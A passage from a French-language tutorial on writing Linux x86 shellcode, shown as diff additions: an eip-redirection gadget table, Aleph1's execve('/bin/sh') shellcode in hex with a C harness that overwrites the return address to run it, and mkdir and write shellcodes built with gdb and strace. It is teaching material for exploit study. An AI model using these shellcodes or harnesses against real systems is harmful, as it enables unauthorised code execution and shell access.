+ |	call [ebp + 8] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebp + 12] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebp + 16] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebp + 20] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ | 	call [ebp + 24] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebp + 28] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [ebp + 32] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esp + 0] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ | 	call [esp + 4] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esp + 8] 		|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esp + 32] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esp + 12] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esp + 16] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esp + 20] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esp + 24] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	call [esp + 28] 	|	[reg + offset] => eip   |	call [reg + offset]       | 	
+ |	jmp [esp + 32] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esp + 12] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esp + 16] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esp + 20] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esp + 24] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	jmp [esp + 28] 		|	[reg + offset] => eip   |	jmp [reg + offset] 	  |
+ |	popaw, ret    		|	[esp + 0x10] => eip 	|	popaw/ret                 |	
+ |	popad, ret    		|	[esp + 0x20] => eip 	|	popad/ret 	          |
+ |	jmp [eax] 		|	[reg] => eip 		|	jmp [reg + offset] 	  |
+ |	jmp [ebx] 		|	[reg] => eip 		|	jmp [reg + offset] 	  |
+ |	jmp [ecx] 		|	[reg] => eip 		|	jmp [reg + offset] 	  |
+ |	jmp [edx] 		|	[reg] => eip 		|	jmp [reg + offset] 	  |
+ |	jmp [edi] 		|	[reg] => eip 		|	jmp [reg + offset] 	  |
+ |	jmp [esi] 		|	[reg] => eip 		|	jmp [reg + offset] 	  |
+ |	jmp [esp] 		|	[reg] => eip 		|	jmp [reg + offset] 	  |
+ |	call [eax] 		|	[reg] => eip 		|	call [reg + offset]       |       
+ |	call [ebx] 		|	[reg] => eip 		|	call [reg + offset]       | 	  
+ |	call [ecx] 		|	[reg] => eip 		|	call [reg + offset]       | 	  
+ |	call [edx] 		|	[reg] => eip 		|	call [reg + offset]       | 	  
+ |	call [edi] 		|	[reg] => eip 		|	call [reg + offset]       | 	  
+ |	call [esi] 		|	[reg] => eip 		|	call [reg + offset]       | 	  
+ |	call [esp] 		|	[reg] => eip 		|	call [reg + offset]       | 	  
+  ------------------------------------------------------------------------------------------------
+
+
+
+- nop : Null OPerations, on l'utilise généralement pour remplir un buffer vulnérable, c'est
+        en fait une instruction ... vide. --> 0x90.
+
+- Elf : Executable and Linkable Format, On parle de format ELF lorsqu'on veut designer
+	le format binaire pour linux.
+
+- offset : on utilise généralement un offset lors d'un buffer overflow, dans cet
+	   article, et précisement dans l'annexe nous allons utiliser un offset pour 
+	   exploiter un buffer overflow très simple.
+
+
+
+	---[ 03 ]   Retour au moyen age.
+
+
+
+Bien évidemment, on va pas retourner au moyen-âge :p, on va simplement revoir un peu
+les bases de la programmation en ASM qui vous seront nécessaires pour bien comprendre
+cet article, ce petit supplément ne fera pas de vous un codeur asm, il vous donnera
+juste les bases nécessaires pour capter l'article, qui n'a rien de très l33t en soi. 
+
+PUSH : Place une valeur sur le haut de la stack.
+POP : enleve la derniere valeur du haut de la stack.
+JMP : fait un saut vers une autre partie du programme.
+MOV : transfert de donnee.
+CALL : appel de sous programme.
+XOR : operation logique souvent utilisé pour le cryptage. (indicateur)
+
+C'est donc un langage de bas niveau, complété d'instructions qui représentent le langage
+machine. Si pour vous toutes ces notions sont vraiment nouvelles, le mieux est d'aller
+sur des sites comme http://www.linuxassembly.org ou vous pourrez voir de plus près 
+l'assembleur sous linux.
+Faire un tutorial sur l'asm est une perte de temps, et ce n'est pas le but de cet article.
+
+
+	---[ 04 ]   Shellcoding - traditionnel execve.
+
+
+Qu'entend-t-il par là celui-là ? Qu'est-ce qu'il raconte comme conneries ce con encore !
+Je parle tout simplement du Aleph1 Shellcode (référence yeah), qui utilise l'appel
+systeme execve(). Je ne vais pas m'attarder dans cette partie, elle a été largement, dans
+90 % des articles, pas grave, un de plus un de moins...
+Allez on va voir ca, pour le principe.
+
+voici sa syntaxe :
+
+
+	char * name[] = {"/bin/sh", NULL};
+	execve(name[0], name, NULL);
+
+
+Il s'agit bien sûr du shellcode le plus connu de tous les temps. On va sans plus tarder
+donner son code source en C :
+
+
+----------[sh1-a.c]----------
+
+#include <stdio.h>
+
+void main()
+{
+	char *nom[2];
+	nom[0]="/bin/sh";
+	nom[1]=NULL;
+	execve(nom[0],nom,NULL);
+}
+
+----------[sh1-a.c]----------
+
+J'ose espérer ne pas avoir l'obligeance d'expliquer le code, je pense que tout le monde
+peut le comprendre. Ce shellcode ecrit en C appelle le syscall execve() qui est je pense
+le meilleur appel système. Comme vous pouvez le voir de même il va exécuter notre ami
+/bin/sh pour que nous ayons un shell.
+On va alors dans un premier temps compiler le code grâce a gcc.
+Voici la méthode à suivre :
+
+
+
+	bash-2.05b$ ls
+	paper.txt  sh1-a.c
+
+	bash-2.05b$ gcc -o sh1-a -static sh1-a.c
+	sh1-a.c: In function `main':
+	sh1-a.c:4: warning: return type of `main' is not `int'
+
+	bash-2.05b$ ls
+	paper.txt  sh1-a  sh1-a.c
+
+	bash-2.05b$ sh1-a
+	sh-2.05b$ exit
+	bash-2.05b$
+
+Nous avons executé le petit programme et comme convenu, il a exécuté /bin/sh. La preuve en est
+lors du changement du bash au sh. Normal, notre programme a donc exécuté /bin/sh grâce à
+notre petit appel système. On va pas s'attarder, on va directement passer à l'acte, en utilisant
+GDB (man gdb pour son utilisation). On va donc, lancer le désassemblage du programme en faisant 
+gdb sh1-a, et par la suite, désassembler la fonction main, et voir ainsi les résultats.
+
+	bash-2.05b$ gdb sh1-a
+	GNU gdb 6.1.1
+	Copyright 2004 Free Software Foundation, Inc.
+	GDB is free software, covered by the GNU General Public License, and you are
+	welcome to change it and/or distribute copies of it under certain conditions.
+	Type "show copying" to see the conditions.
+	There is absolutely no warranty for GDB.  Type "show warranty" for details.
+	This GDB was configured as "i486-slackware-linux"...Using host libthread_db library "/lib/libthread_db.so.1".
+
+	(gdb) disassemble main
+	Dump of assembler code for function main:
+	0x08048214 <main+0>:    push   %ebp
+	0x08048215 <main+1>:    mov    %esp,%ebp
+	0x08048217 <main+3>:    sub    $0x8,%esp
+	0x0804821a <main+6>:    and    $0xfffffff0,%esp
+	0x0804821d <main+9>:    mov    $0x0,%eax
+	0x08048222 <main+14>:   sub    %eax,%esp
+	0x08048224 <main+16>:   movl   $0x8095c88,0xfffffff8(%ebp)
+	0x0804822b <main+23>:   movl   $0x0,0xfffffffc(%ebp)
+	0x08048232 <main+30>:   sub    $0x4,%esp
+	0x08048235 <main+33>:   push   $0x0
+	0x08048237 <main+35>:   lea    0xfffffff8(%ebp),%eax
+	0x0804823a <main+38>:   push   %eax
+	0x0804823b <main+39>:   pushl  0xfffffff8(%ebp)
+	0x0804823e <main+42>:   call   0x804ce50 <execve>
+	0x08048243 <main+47>:   add    $0x10,%esp
+	0x08048246 <main+50>:   leave
+	0x08048247 <main+51>:   ret
+	0x08048248 <main+52>:   nop
+	0x08048249 <main+53>:   nop
+	0x0804824a <main+54>:   nop
+	0x0804824b <main+55>:   nop
+	0x0804824c <main+56>:   nop
+	---Type <return> to continue, or q <return> to quit---
+	0x0804824d <main+57>:   nop
+	0x0804824e <main+58>:   nop
+	0x0804824f <main+59>:   nop
+	End of assembler dump.
+	(gdb) quit
+	bash-2.05b$
+
+
+J'en conclus en analysant les résultats qu'il va faloir que :
+
+- /bin/sh\0 soit dans la memoire.
+- l'adresse de /bin/sh\0 soit dans la memoire.
+- %eax=0xb.
+- %ebx soit l'adresse de /bin/sh\0.
+- %ecx soit en quelque sorte l'adresse de l'adresse de /bin/sh\0.
+- %edx soit null.
+
+J'ai crée un tableau pour que nous puissions voir les choses plus simplement et 
+directement retranscries :
+
+  ________________________________________________________________________
+ |									  |
+ |	jmp		0x1f			"\xeb\x1f"		  |
+ |									  |
+ |	popl		%esi			"\x5e"			  |
+ |									  |
+ |	movl		%esi, 0x8(%esi)		"\x89\x76\x08"		  |
+ |									  |
+ |	xorl		%eax, %eax		"\x31\xc0"		  |
+ |									  |
+ |	movb		%eax, %0x7(%esi)	"\x88\x46\x07"		  |
+ |									  |
+ |	movl		%eax, %0xc(%esi)	"\x89\x46\x0c"		  |
+ |									  |
+ |	movb		$0xb,%al		"\xb0\x0b"		  |
+ |									  |
+ |	movl		%esi, %ebx		"\x89\xf3"		  |
+ |									  |
+ |	leal		0x8(%esi),%ecx		"\x8d\x4e\x08"		  |
+ |									  |
+ |	leal		0xc(%esi),%edx		"\x8d\x56\x0c"		  |
+ |									  |
+ |	int		$0x80			"\xcd\x80"		  |
+ |									  |
+ |	xorl		%ebx,%ebx		"\x31\xdb"		  |
+ |									  |
+ |	movl		%ebx,%eax		"\x89\xd8"		  |
+ |									  |
+ |	inc		%eax			"\x40"			  |
+ |									  |
+ |	int		$0x80			"\xcd\x80"                |
+ |									  |
+ |	call		-0x24			"\xe8\xdc\xff\xff\xff"    |
+ |									  |
+ |	.string		"/bin/sh"		"/bin/sh"		  |
+ |________________________________________________________________________|
+
+Note : on utilise .string afin d'etre sur que ca termine par 0.
+
+Dans ce tableau, on peut voir les correspondances entre le code assembleur
+et le code héxadécimal. Dans le même genre, si vous avez envie d'exécuter 
+du code assembleur comme ceci dans un code C, vous pouvez faire cela de
+cette facon : 
+
+	void main() {
+	__asm__(" CODE ASSEMBLEUR ");
+	}
+
+C'est précisément ce qu'à fait Aleph1 pour tester son shellcode.
+On utilise une petite technique très connue pour l'executer :
+
+	[bleyme@localhost Desktop]$ cat sh1-b.c
+	char shellcode[] =
+
+	     "\xeb\x1f"
+	     "\x5e"
+	     "\x89\x76\x08"
+	     "\x31\xc0"
+	     "\x88\x46\x07"
+ 	     "\x89\x46\x0c"
+	     "\xb0\x0b"
+	     "\x89\xf3"
+	     "\x8d\x4e\x08"
+ 	     "\x8d\x56\x0c"
+	     "\xcd\x80"
+	     "\x31\xdb"
+ 	     "\x89\xd8"
+ 	     "\x40"
+             "\xcd\x80"
+ 	     "\xe8\xdc\xff\xff\xff"
+ 	     "/bin/sh";
+
+	 void main() {
+  	 int *ret;
+   	 ret = (int *)&ret + 2;
+   	 (*ret) = (int)shellcode;
+	 }
+
+	[bleyme@localhost Desktop]$ 
+
+	[bleyme@localhost Desktop]$ gcc -o sh1-a sh.c
+	sh.c: In function `main':
+	sh.c:19: warning: return type of `main' is not `int'
+	sh.c:23:3: warning: no newline at end of file
+
+	[bleyme@localhost Desktop]$ ./sh1-a
+	sh-2.05b$
+
+Voilà pour cette partie, elle est surtout là pour présenter les shellcodes et n'a
+evidemment rien d'innovant. Passons à la 5eme partie.
+
+
+	---[ 05 ]   Shellcoding - C coding - syscall strace.
+
+Comme le titre l'indique, nous allons voir comment programmer des shellcodes
+à partir du langage C, et voir comment on peut dans un programme retrouver
+les appels systemes grace a STRACE.
+Il existe sous linux un outil nommé strace qui permet de tracer l'éxecution
+d'un programme, l'outil consiste à analyser le comportement du programme
+lorsqu'il interagit avec l'OS. La trace donne des informations comme les
+adresses mémoires utilisées par le programme. Avec cette technique on peut
+remarquer des problèmes dans l'execution d'un programme. 
+
+On énumère les syscalls les plus importants, nous avons déjà montré 
+l'utilisation de execve() dans la partie précédente.
+
+ - execve()
+ - close()
+ - open()
+ - socket()
+ - write()
+
+Mais vous pouvez avoir une liste complète sur la man linux en faisant ceci :
+
+	[bleyme@localhost Desktop]$ man syscalls 
+
+Ca va nous donner une liste de syscall avec des explications, voici la liste :
+
+	_llseek(2), _newselect(2), _sysctl(2), access(2), acct(2), adjtimex(2),
+	afs_syscall,  alarm(2),  bdflush(2), break, brk(2), chdir(2), chmod(2),
+	chown(2), chroot(2), clone(2),  close(2),  creat(2),  create_module(2),
+	delete_module(2),  dup(2), dup2(2), execve(2), exit(2), fchdir(2), fch-
+	mod(2), fchown(2), fcntl(2), fdatasync(2), flock(2), fork(2), fstat(2),
+	fstatfs(2),  fsync(2),  ftime,  ftruncate(2),  get_kernel_syms(2), get-
+	dents(2),  getegid(2),  geteuid(2),   getgid(2),   getgroups(2),   get-
+	itimer(2),   getpgid(2),   getpgrp(2),   getpid(2),   getppid(2),  get-
+	priority(2), getrlimit(2),  getrusage(2),  getsid(2),  gettimeofday(2),
+	getuid(2), gtty, idle(2), init_module(2), ioctl(2), ioperm(2), iopl(2),
+	ipc(2), kill(2), link(2), lock, lseek(2), lstat(2), mkdir(2), mknod(2),
+	mlock(2),  mlockall(2),  mmap(2), modify_ldt(2), mount(2), mprotect(2),
+	mpx,  mremap(2),  msync(2),   munlock(2),   munlockall(2),   munmap(2),
+	nanosleep(2),   nice(2),   oldfstat,  oldlstat,  oldolduname,  oldstat,
+	olduname, open(2), pause(2), personality(2), phys, pipe(2), prof,  pro-
+	fil,   ptrace(2),   quotactl(2),   read(2),   readdir(2),  readlink(2),
+	readv(2), reboot(2),  rename(2),  rmdir(2),  sched_get_priority_max(2),
+	sched_get_priority_min(2),   sched_getparam(2),  sched_getscheduler(2),
+	sched_rr_get_interval(2),   sched_setparam(2),   sched_setscheduler(2),
+	sched_yield(2),  select(2), setdomainname(2), setfsgid(2), setfsuid(2),
+	setgid(2), setgroups(2), sethostname(2), setitimer(2), setpgid(2), set-
+	priority(2),  setregid(2),  setreuid(2),  setrlimit(2), setsid(2), set-
+	timeofday(2),  setuid(2),  setup(2),  sgetmask(2),  sigaction(2),  sig-
+	nal(2),  sigpending(2),  sigprocmask(2),  sigreturn(2),  sigsuspend(2),
+	socketcall(2),  ssetmask(2), 
+        stat(2), statfs(2), stime(2), stty, swapoff(2), swapon(2),
+        symlink(2),  sync(2),  sysfs(2),  sysinfo(2),   syslog(2),
+        time(2),    times(2),   truncate(2),   ulimit,   umask(2),
+        umount(2),  uname(2),  unlink(2),   uselib(2),   ustat(2),
+        utime(2),   vhangup(2),   vm86(2),  wait4(2),  waitpid(2),
+        write(2), writev(2).
+
+
+
+Il y a ici tous les syscalls, avec l'explication francaise de chaque syscall :
+http://dpobel.free.fr/man/html/affiche_man.php/5730/man/syscalls/
+
+ - Retrouver un appel système
+version très simplifié, il est très souvent plus lourd de retrouver
+des syscalls, mais dans l'ensemble, en se plongeant, cela demeure
+être très faisable.
+
+Pour notre exemple, ca sera voir TRES faisable :
+
+
+uiii.c -
+
+#include <stdio.h>
+int main()
+{
+	printf("hello");
+}
+
+
+	[bleyme@localhost Desktop]$ gcc -o uiii uiii.c
+	uiii.c:6:2: warning: no newline at end of file
+
+	[bleyme@localhost Desktop]$ strace ./uiii
+
+	execve("./uiii", ["uiii"], [/* 23 vars */]) = 0
+	uname({sys="Linux", node="Debian", ...}) = 0
+	brk(0)                                  = 0x80494a8
+	open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)
+	open("/etc/ld.so.cache", O_RDONLY)      = 3
+	fstat64(3, {st_mode=S_IFREG|0644, st_size=48357, ...}) = 0
+	old_mmap(NULL, 48357, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40012000
+	close(3)                                = 0
+	open("/lib/libc.so.6", O_RDONLY)        = 3
+	read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\275Z\1"..., 1024) = 1024
+	fstat64(3, {st_mode=S_IFREG|0755, st_size=1104072, ...}) = 0
+	old_mmap(NULL, 1113828, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x4001e000
+	mprotect(0x40126000, 32484, PROT_NONE)  = 0
+	old_mmap(0x40126000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x107000) = 0x40126000
+	old_mmap(0x4012c000, 7908, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x4012c000
+	close(3)                                = 0
+	old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4012e000
+	munmap(0x40012000, 48357)               = 0
+	fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(3, 1), ...}) = 0
+	ioctl(1, SNDCTL_TMR_TIMEBASE, {B38400 opost isig icanon echo ...}) = 0
+	old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40012000
+	write(1, "hello", 5hello)                    = 5
+	munmap(0x40012000, 4096)                = 0
+	exit_group(5)                           = ?
+
+
+Ici l'important à retenir est : 
+write(1, "hello", 5hello)                    = 5
+
+C'est le syscall utilisé pour faire un printf().
+Je suis d'accord avec vous, ce n'est pas très très interessant, mais c'est juste
+une micro introduction à la recherche de syscall.
+
+Que faire lorsque l'on veut coder un syscall ?
+Il faut tout d'abord coder le programme en C, comme nous le ferons
+tout à l'heure, en utilisant la fonction static (en ajoutant -static aux flags
+gcc). Ensuite il faut désassembler, pour moi ça sera avec gdb. Désassembler quoi ?
+
+  - main()
+  - libc functions
+
+Ensuite, ce n'est qu'après qu'on peut analyser le fonctionnement d'un syscall 
+et ensuite commencer à coder.
+
+---
+
+Pour commencer cette partie de façon technique, nous allons élaborer un pseudo
+programme théorique, afin d'analyser ensuite qu'est-ce qu'il se passe au niveau
+de la stack :
+
+#include <stdio.h>
+int execve(const char *nomfichier,
+	char *const argv[], 
+	char *envp[]
+);
+
+int main(void)
+	{
+	char * nom[] = { "/bin/sh", NULL }
+	}
+
+
+La première chose à faire, comme toujours, c'est de sortir gdb, on désassemble
+main et on voit ce qu'il se passe :
+
+	[bleyme@localhost shcode]$ gdb exemple
+	(gdb) disass main
+
+	push  %ebp
+	mov   %esp, %ebp
+	sub   $0x8, %esp
+	leal  0xfffffff8(%ebp), %eax
+	movl  $0x808b6c8,0xfffffff8(%ebp)
+	movl  $0x0,0xfffffffc(%ebp)
+	push  $0x0
+	leal  0xfffffff8(%ebp),%eax
+	push  %eax
+	mov   0xfffffff8(%ebp),%eax
+	push  %eax
+	call  0x804bf90 <execve>
+	push  %ebp
+	mov   %esp,%ebp
+
+		[...]
+
+	mov   0x8(%ebp),%edi
+	mov   $0x0k,%eax
+	mov   0xc(%ebp),%ecx
+	mov   0x10(%ebp),%edx
+	push  %ebx
+	mov   %edi,%ebx
+	mov   $0xb,%eax
+	int   $0x80
+
+
+Grâce aux désassemblages de la fonction main(), nous allons tout simplement
+retranscrire les informations sur un schéma caractérisant la PILE / STACK.
+Si %ebx prend l'addresse de la string /bin/sh on peut rajouter cela comme
+code :
+
+	movl    %ebx, 0x8(%ebx)
+	movb    $0x0, 0x7(%ebx)
+	movl    $0x0, 0xc(%ebx)
+	leal    0x8(%ebx), %ecx
+	leal    0xc(%ebx), %edx
+	movl    movl $0xb, %eax
+	int $	0x80
+
+Schéma caractérisant les données sur la PILE / STACK :
+
+	     [stack]
+      Haut      |
+	 ---------------
+	|      SFP	|  <-- push %ebp   ET   mov %esp, %ebp
+	|---------------|
+	|     $0x0	|  <-- movl  $0x0,0xfffffffc(%ebp)
+	|---------------|
+	|  $0x808b6c8	|  <-- movl  $0x808b6c8,0xfffffff8(%ebp)
+	|---------------|
+	|     $0x0      |  <-- push  $0x0
+	|---------------|
+	|     name	|  <-- push  %eax (le premier)
+	|---------------|
+	|  $0x808b6c8	|  <-- push  %eax (le second)
+	|---------------|
+	|   0x804bf90	|  <-- call  0x804bf90 <execve>
+	|---------------|
+	|     $0x0      |  <-- movl    $0x0, 0xc(%ebx)
+	|---------------|
+	|     addr	|  <-- movl    %ebx, 0x8(%ebx)
+	|---------------|
+	|      /sh      |  <-- sh
+	|---------------|
+	|     /bin      |  <-- bin
+	 ---------------
+      Bas	
+
+Comme vous avez pu le remarquer on ne voit pas de string /bin/sh, en effet
+on doit donc avoir la string /bin/sh dans la mémoire.
+
+Passons à des choses plus concrêtes, c'est à dire faire un shellcode qui
+utilise mkdir pour créer un dossier spécial. Ce type de shellcode ne sert
+strictement à rien, si ce n'est apprendre des choses, chose importantes c'est
+vrai. Et bien nous allons shellcodifier tout ça (wow un nouveau mot). 
+Petit rappel pour ceux qui ne connaissent pas du tout (on sait jamais) :
+
+	[bleyme@localhost shellcodes-poly]$ ls
+	paper.txt  shcode/
+
+	[bleyme@localhost shellcodes-poly]$ mkdir nnl
+
+	[bleyme@localhost shellcodes-poly]$ ls
+	nnl/  paper.txt  shcode/
+
+
+Pour mieux comprendre les shellcodes, on va faire un programme en C utilisant
+la commande shell mkdir.
+voici le pseudo code :
+
+mkdir.c
+----------------------------------
+
+#include <stdio.h> 
+int main() 
+{ 
+	mkdir("kuul", 0755); 
+	return 0; 
+}
+
+----------------------------------
+
+On compile et on vérifie :
+
+	[bleyme@localhost shcode]$ gcc -o mkdir mkdir.c
+	[bleyme@localhost shcode]$ ./mkdir
+
+	[bleyme@localhost shcode]$ ls -la
+	total 996
+	drwx------  2 bleyme bleyme   4096 mar 28 04:37 kuul/
+	-rwx------  1 bleyme bleyme  11255 mar 28 04:37 mkdir*
+	-rw-r--r--  1 bleyme bleyme     72 mar 28 04:35 mkdir.c
+	-rw-------  1 bleyme bleyme   1074 mar 20 15:28 outp.c
+	-rwxr-xr-x  1 bleyme bleyme 462435 mar 20 15:31 sh1-a*
+	-rw-------  1 bleyme bleyme    118 mar 20 15:28 sh1-a.c
+	-rw-------  1 bleyme bleyme      1 mar 20 15:28 sh1-c.c
+	-rwxr-xr-x  1 bleyme bleyme    833 mar 20 15:31 sh2*
+	-rw-------  1 bleyme bleyme    276 mar 20 15:28 sh2.asm
+	-rw-r--r--  1 bleyme bleyme    608 mar 20 15:30 sh2.o
+	-rwxr-xr-x  1 bleyme bleyme  10814 mar 20 15:28 sh2test*
+	-rw-------  1 bleyme bleyme    419 mar 20 15:28 sh2test.c
+	-rw-------  1 bleyme bleyme    254 mar 20 15:27 sh3test.c
+	-rwxr-xr-x  1 bleyme bleyme 462435 mar 20 15:29 shell*
+	-rwxr-xr-x  1 bleyme bleyme  10697 mar 20 15:28 sh-exit*
+	-rw-r--r--  1 bleyme bleyme     50 mar 20 15:28 sh-exit.c
+
+On peut voir, en premier, le repertoire kuul/ crée, il va faloir donc transformer
+ce code en asm ou plutôt AT&T.
+Pour cela, on va voir ça plus en détail notre fichier mkdir grace à gdb :
+
+	[bleyme@localhost shcode]$ gdb ./mkdir
+	GNU gdb 6.1.1
+	Copyright 2004 Free Software Foundation, Inc.
+	GDB is free software, covered by the GNU General Public License, and you are
+	welcome to change it and/or distribute copies of it under certain conditions.
+	Type "show copying" to see the conditions.
+	There is absolutely no warranty for GDB.  Type "show warranty" for details.
+	This GDB was configured as "i486-slackware-linux"...Using host libthread_db library "/lib/libthread_db.so.1".
+ 
+	(gdb) disassemble main
+	Dump of assembler code for function main:
+	0x0804835c <main+0>:    push   %ebp
+	0x0804835d <main+1>:    mov    %esp,%ebp
+	0x0804835f <main+3>:    sub    $0x8,%esp
+	0x08048362 <main+6>:    and    $0xfffffff0,%esp
+	0x08048365 <main+9>:    mov    $0x0,%eax
+	0x0804836a <main+14>:   sub    %eax,%esp
+	0x0804836c <main+16>:   sub    $0x8,%esp
+	0x0804836f <main+19>:   push   $0x1ed
+	0x08048374 <main+24>:   push   $0x8048488
+	0x08048379 <main+29>:   call   0x8048278
+	0x0804837e <main+34>:   add    $0x10,%esp
+	0x08048381 <main+37>:   mov    $0x0,%eax
+	0x08048386 <main+42>:   leave
+	0x08048387 <main+43>:   ret
+	0x08048388 <main+44>:   nop
+	0x08048389 <main+45>:   nop
+	0x0804838a <main+46>:   nop
+	0x0804838b <main+47>:   nop
+	0x0804838c <main+48>:   nop
+	0x0804838d <main+49>:   nop
+	0x0804838e <main+50>:   nop
+	0x0804838f <main+51>:   nop
+	End of assembler dump.
+	(gdb) quit
+
+	[bleyme@localhost shcode]$
+
+
+Pour information, et pour que celà soit plus clair, on commence toujours un code 
+AT&T comme ceci :
+
+.section .text 
+.global main 
+main: 
+
+On place ensuite les instructions.
+L'héxadécimal de "kuul" est : 6B75 756C. On va l'utiliser comme cela dans la source
+.s en assembleur :
+
+	pushl $0x0 
+	pushl $0x6C75756B 
+
+Cette ligne : 0x0804836f <main+19>:   push   $0x1ed
+va devenir :
+
+	movl $0x1ed, %ecx
+
+Viens après le traditionnel 0x0804835d <main+1>:    mov    %esp,%ebp
+Qui lui va garder à peu près sa forme :
+
+	movl %esp, %ebx
+
+
+Pour le moment, notre mkdir.s a une forme convenable, elle ne suffit effectivement pas :
+
+	.section .text 
+	.global main 
+	main:
+
+	pushl $0x0 
+	pushl $0x6C75756B
+	movl $0x1ed, %ecx
+	movl %esp, %ebx
+
+Maintenant, pour finir, nous devrons alors :
+
+  - retourner la valeur de 0
+  - placer le 0 dans ebx
+
+Nous allons faire comme cela :
+
+	xorl 	%ebx, %ebx 
+	movl 	$0x1, %eax 
+	int 	$0x80 
+
+Notre petit programme AT&T se trouve maintenant comme ceci :
+
+;---------------------------------
+
+; 
+; mk.S - mkdir shellcode 
+;
+
+.section .text 
+.global main 
+
+main: 
+	pushl   $0x0 
+	pushl   $0x6C75756B
+	movl    $0x1ed, %ecx
+	movl    %esp, %ebx
+	movb 	$0x27, %al 
+	int 	$0x80 
+	xorl 	%ebx, %ebx 
+	movl 	%ebx, %eax 
+	incl 	%eax 
+	int 	$0x80 
+;---------------------------------
+
+	[bleyme@localhost shcode]$ gcc -o mkdirtest mk.S
+
+	[bleyme@localhost shcode]$ gdb mkdirtest
+	GNU gdb 6.1.1
+	Copyright 2004 Free Software Foundation, Inc.
+	GDB is free software, covered by the GNU General Public License, and you are
+	welcome to change it and/or distribute copies of it under certain conditions.
+	Type "show copying" to see the conditions.
+	There is absolutely no warranty for GDB.  Type "show warranty" for details.
+	This GDB was configured as "i486-slackware-linux"...Using host libthread_db library "/lib/libthread_db.so.1".
+ 
+	(gdb) x/30b main
+	0x804832c <main>:       0x6a    0x00    0x68    0x6b    0x75    0x75    0x6c   0 xb9
+	0x8048334 <main+8>:     0xed    0x01    0x00    0x00    0x89    0xe3    0xb8   0 x27
+	0x804833c <main+16>:    0x00    0x00    0x00    0xcd    0x80    0x31    0xdb   0 xb8
+	0x8048344 <main+24>:    0x01    0x00    0x00    0x00    0xcd    0x80
+	(gdb) quit
+
+
+    \x6a\x00\x68\x6b\x75\x75\x6c\xb9
+    \xed\x01\x00\x00\x89\xe3\xb8\x27
+    \x00\x00\x00\xcd\x80\x31\xdb\xb8
+    \x01\x00\x00\x00\xcd\x80
+
+Wow, pleins de null bytes, c'est pas grave, on va pas exploiter de 
+buffer overflow avec ce shellcode, les null bytes on s'en fout pour le moment.
+On le teste ainsi :
+
+#include <stdio.h>
+char shellcode[] = 
+
+	"\x6a\x00\x68\x6b\x75\x75\x6c\xb9" 
+	"\xed\x01\x00\x00\x89\xe3\xb8\x27" 
+	"\x00\x00\x00\xcd\x80\x31\xdb\xb8" 
+	"\x01\x00\x00\x00\xcd\x80"; 
+
+int main(void) 
+
+{ 
+	int * ret; 
+	ret = (int *)&ret + 2; 
+	(*ret) = (int)shellcode; 
+}
+
+Il ne nous reste plus qu'à le tester :
+Et oui ca marche :
+
+	[bleyme@localhost shcode]$ gcc -o mkdirsh mkdirsh.c
+
+	[bleyme@localhost shcode]$ ls
+	mkdir*   mkdir.c~  mkdir.s~  mkdirsh.c   mkdirtest*  sh1-a*   sh1-c.c  sh2.asm  sh2test*   sh3test.c  sh-exit*
+	mkdir.c  mkdir.s   mkdirsh*  mkdirsh.c~  outp.c      sh1-a.c  sh2*     sh2.o    sh2test.c  shell*     sh-exit.c
+
+	[bleyme@localhost shcode]$ ./mkdirsh
+
+	[bleyme@localhost shcode]$ ls
+	kuul/   mkdir.c   mkdir.s   mkdirsh*   mkdirsh.c~  outp.c  sh1-a.c  sh2*     sh2.o     sh2test.c  shell*    sh-exit.c
+	mkdir*  mkdir.c~  mkdir.s~  mkdirsh.c  mkdirtest*  sh1-a*  sh1-c.c  sh2.asm  sh2test*  sh3test.c  sh-exit*
+
+Le répertoire kuul/ a bien été crée.
+Le shellcode fonctionne donc à merveille malgré ses x00.
+
+
+
+Pour la route, un autre exemple en utilisant le syscall write() :
+
+-------------------------------
+#include <stdio.h>
+
+int main()
+{
+  write(1, "miaou le chat\n", 10);
+}
+-------------------------------
+
+D'un point de vu squeletique, un shellcode de ce type peut etre
+codé de cette facon (explication plus bas) :
+
+jump _jmp
+_call:
+	[ugh!]
+_jmp:
+	call _call
+	.string "truc !!!"
+
+
+Alors codons :)
+nous allons le mettre au format AT&T : 
+
+;-----------------------------------
+; Write syscall shellcode
+; syswrite.S
+;-----------------------------------
+.global com
+com:
+	jmp _call
+_jmp:
+
+	xorl %eax, %eax
+	xorl %ebx, %ebx
+	xorl %edx, %edx
+	movb $0x1, %bl
+	popl %ecx
+	movb $0xa, %dl
+	movb $0x4, %al
+	int $0x80
